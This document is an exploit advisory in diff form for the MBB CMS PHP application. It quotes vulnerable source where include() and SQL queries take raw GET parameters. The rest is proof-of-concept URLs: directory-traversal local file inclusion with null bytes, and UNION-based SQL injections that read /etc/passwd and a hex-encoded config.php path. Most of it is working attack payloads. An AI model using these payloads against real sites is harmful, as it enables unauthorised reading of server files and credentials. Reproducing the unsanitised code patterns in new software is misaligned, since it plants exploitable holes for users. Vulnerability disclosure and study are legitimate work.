@@ -1,0 +1,73 @@
+# MBB CMS <= 004 (LFI/SQLi) Multiple Vulnerability
+# By cr4wl3r http://bastardlabs.info
+# Script http://sourceforge.net/projects/phpmbbcms/
+# Tested : Windows / Linux
+# Dork   : N/A
+###################################################
+# LFI [ MBB_CMS/index.php ]
+# .......
+# 22 if(isset($_GET['mod'])){
+# 23   $a=$_GET['mod'];
+# 24   switch($a){
+# 25    case $a:
+# 26       if(file_exists("modul/$a/$a.php")){
+# 27         include("modul/$a/$a.php");
+# 28       }else{
+# 29         include("site/main.php");
+# 30       }
+# 31     break;
+# 32   }
+# 33 }else{
+# 34   $a=$_GET['ref'];
+# 35   switch($a){
+# 36 
+# 37     case"login": logForm(); break;
+# 38     case"logact": login(); break;
+# 39     case"logout": logout(); break;
+# 40 
+# 41    case $a:
+# 42       if(file_exists("site/$a.php")){
+# 43         include("site/$a.php");
+# 44       }else if(file_exists("site/$a/$a.php")){
+# 45         include("site/$a/$a.php");
+# 46       }else{
+# 47         include("site/main.php");
+# 48       }
+# 49     break;
+# .......
+############################################################
+ Proof of Concept
+ http://127.0.0.1/[MBB_CMS]/?mod=[LFI]%00
+ http://127.0.0.1/[MBB_CMS]/?ref=[LFI]%00
+ http://127.0.0.1/[MBB_CMS]/?mod=../../../../../../../../../../../../../[file]%00
+ http://127.0.0.1/[MBB_CMS]/?ref=../../../../../../../../../../../../../[file]%00
+
+# SQLi [ MBB_CMS/modul/article/article.php ]
+# ........
+# 18 $id=$_GET['id'];
+# 19 $query=mysql_query("select artikel_artikel.id,artikel_artikel.catid,artikel_cat.kategori 
+#    from artikel_artikel join artikel_cat on artikel_artikel.catid=artikel_cat.id 
+#    where artikel_artikel.id='$id'");
+# ........
+#
+# .....
+# 173 function category(){
+# 174   $catid=$_GET['catid'];
+# 175   @list($kategori)=mysql_fetch_array(mysql_query("select kategori from artikel_cat where id='$catid'"));
+# .....
+#################################
+ Proof of Concept
+ http://127.0.0.1/[MBB_CMS]/?mod=article&act=detail&id=[SQLi]
+ http://127.0.0.1/[MBB_CMS]/?mod=article&act=category&catid=[SQLi]
+ http://127.0.0.1/[MBB_CMS]/?mod=article&act=detail&id=adhan' union select 1,2,version(),4,5 and 'memang'='ganteng
+ http://127.0.0.1/[MBB_CMS]/?mod=article&act=category&catid=adhan' union select 1,2,load_file('/etc/passwd'),4,5 and 'memang'='ganteng
+
+# SQLi [MBB_CMS/site/page/page.php ]
+# .......
+# 92 $pid=$_GET['pid'];
+# 93       @list($name)=mysql_fetch_array(mysql_query("select title from pages where pub='1' and id='$pid'"));
+# ......
+###########################################
+ Proof of Concept
+ http://127.0.0.1/[MBB_CMS]/?ref=page&pid=[SQLi]
+ http://127.0.0.1/[MBB_CMS]/?ref=page&pid=adhan' union select 1,2,load_file(0x433a2f417070536572762f7777772f64656d6f2f7379732f636f6e6669672e706870),4,5 and 'memang'='ganteng
